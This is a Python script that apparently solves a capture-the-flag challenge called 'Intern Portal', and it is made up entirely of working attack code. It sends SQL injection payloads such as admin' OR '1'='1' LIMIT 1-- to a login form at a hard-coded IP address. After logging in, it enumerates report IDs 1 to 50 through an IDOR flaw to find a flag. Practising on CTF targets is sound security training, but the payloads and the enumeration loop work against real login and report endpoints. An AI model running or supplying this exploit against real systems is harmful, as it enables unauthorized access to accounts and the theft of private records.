#!/usr/bin/env python3
"""
Intern Portal - SQL Injection Exploit
Login as admin and find the flag
"""

import requests
from bs4 import BeautifulSoup
import re

TARGET = "http://23.179.17.92:5001"

print("="*70)
print("INTERN PORTAL - SQL INJECTION EXPLOIT")
print("="*70)

# Try to login as admin using SQL injection
print(f"\n[1] Attempting SQL injection login as admin...")

sqli_payloads = [
    {"username": "admin' OR '1'='1' LIMIT 1--", "password": "x"},
    {"username": "admin'--", "password": "x"},
    {"username": "' OR user_id=1--", "password": "x"},
    {"username": "' UNION SELECT 1--", "password": "x"},
]

for payload in sqli_payloads:
    print(f"\n  Trying: {payload['username']}")
    
    session = requests.Session()
    resp = session.post(f"{TARGET}/login", data=payload, allow_redirects=True)
    
    print(f"    Status: {resp.status_code}")
    print(f"    URL: {resp.url}")
    
    # Check if logged in
    if 'dashboard' in resp.url.lower() or 'Dashboard' in resp.text:
        print(f"    ✓ Logged in!")
        
        # Check session cookie
        for cookie in session.cookies:
            if cookie.name == 'session':
                print(f"    Session: {cookie.value[:50]}...")
        
        # Get dashboard
        dash_resp = session.get(f"{TARGET}/")
        soup = BeautifulSoup(dash_resp.text, 'html.parser')
        
        # Check for reports
        report_links = soup.find_all('a', href=re.compile(r'/report\?id='))
        print(f"    Reports found: {len(report_links)}")
        
        for link in report_links:
            href = link.get('href')
            report_text = link.get_text().strip()
            print(f"      {report_text}: {href}")
            
            # Access each report
            report_resp = session.get(f"{TARGET}{href}")
            
            if 'CIT{' in report_resp.text:
                print(f"\n      ✓✓✓ FLAG FOUND in {href}!")
                match = re.search(r'CIT\{[^}]+\}', report_resp.text)
                if match:
                    flag = match.group(0)
                    print(f"      FLAG: {flag}")
                    exit(0)
            
            # Show report content
            report_soup = BeautifulSoup(report_resp.text, 'html.parser')
            content_div = report_soup.find('div', class_='report-content')
            if content_div:
                content = content_div.get_text().strip()
                print(f"        Content: {content[:100]}...")
        
        # Check if flag is in dashboard itself
        if 'CIT{' in dash_resp.text:
            print(f"\n    ✓✓✓ FLAG FOUND in dashboard!")
            match = re.search(r'CIT\{[^}]+\}', dash_resp.text)
            if match:
                print(f"    FLAG: {match.group(0)}")
                exit(0)
        
        # Try to access all reports (IDOR)
        print(f"\n  [2] Checking first 50 reports via IDOR...")
        for report_id in range(1, 51):
            try:
                resp = session.get(f"{TARGET}/report?id={report_id}", timeout=2)
                
                if 'CIT{' in resp.text:
                    print(f"\n    ✓✓✓ FLAG FOUND in report ID {report_id}!")
                    match = re.search(r'CIT\{[^}]+\}', resp.text)
                    if match:
                        print(f"    FLAG: {match.group(0)}")
                        exit(0)
            except:
                pass
        
        break

print(f"\n{'='*70}")
